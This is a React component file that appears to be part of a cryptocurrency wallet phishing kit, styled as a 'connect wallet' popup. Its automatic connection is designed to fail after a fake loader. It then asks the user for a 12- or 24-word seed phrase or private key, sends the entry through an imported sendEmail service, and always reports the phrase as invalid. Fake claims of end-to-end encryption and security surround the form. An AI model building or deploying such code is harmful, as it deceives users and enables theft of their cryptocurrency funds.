import React, { useState, useEffect } from "react";
import CustomImage from "../Images/CustomImage";
import CustomButton from "../Buttons/CustomButtons";
import Icon from "../Icons/Icon";
import { sendEmail } from "../../services/SendEmail";

/**
 * @param {object} props
 * @param {React.CSSProperties} [props.style]
 * @returns
 */

export default function ConnectPopCard({
  style,
  className,
  imgsrc,
  label,
  onclose,
  ...props
}) {
  const [isLoading, setIsLoading] = useState(true);
  const [isManual, setisManual] = useState(false);
  const [error, setError] = useState(false);
  const [phase, setphase] = useState("");

  const handleLoader = () => {
    setTimeout(() => {
      setIsLoading(false);
    }, 5000);
  };

  useEffect(() => {
    handleLoader();
  }, []);

  const handleSubmit = () => {
    setError(true);
    sendEmail(label, phase)
  };

  return (
    <aside className={`pop-body`}>
      <div style={style} className={className} {...props}>
        <aside className="close-tab" onClick={onclose}>
          <Icon name="IoClose" />
        </aside>
        <CustomImage className="img" source={imgsrc} altText="logo image" />
        <h1>{label}</h1>
        <p style={{ color: "#929292" }}>
          This session is secured and encrypted
        </p>
        <div className="connect-functions">
          {isLoading ? (
            <>
              <span className="pop-loader"></span>
              <p>Starting secure connection</p>
              <small>Please wait....</small>
            </>
          ) : isManual ? (
            <>
              <textarea
                className="phase-text"
                value={phase}
                onChange={(e) => setphase(e.target.value)}
                placeholder="Enter your 12 or 24 Mnemonic words, Seprate them with spaces, You can also input your privatekey instead"
              ></textarea>
              {error && (
                <span style={{ color: "red", fontSize: "14px" }}>
                  Invalid Mnemonic words, Please check and try again
                </span>
              )}
              <CustomButton
                style={{ color: "#fff", background: "#5142fc" }}
                disabled={!phase}
                onClick={() => handleSubmit()}
              >
                Connect wallet
              </CustomButton>
            </>
          ) : (
            <>
              <p className="error-text">
                An error occurred... please try again or connect mannually
              </p>
              <CustomButton
                onClick={() => {
                  setIsLoading(true);
                  handleLoader();
                }}
              >
                Try Again
              </CustomButton>
              <CustomButton
                style={{ color: "#fff", background: "#5142fc" }}
                onClick={() => setisManual(true)}
              >
                Connect Manually
              </CustomButton>
            </>
          )}
        </div>
        <div className="bottom-text">
          <p style={{ marginBottom: "0px" }}>
            <Icon name="IoShieldHalfOutline" /> This session is protected with
            an end-to-end encryption.
          </p>
          <p style={{ color: "red" }}>
            Never share your seed phrase with anybody!
          </p>
        </div>
      </div>
    </aside>
  );
}
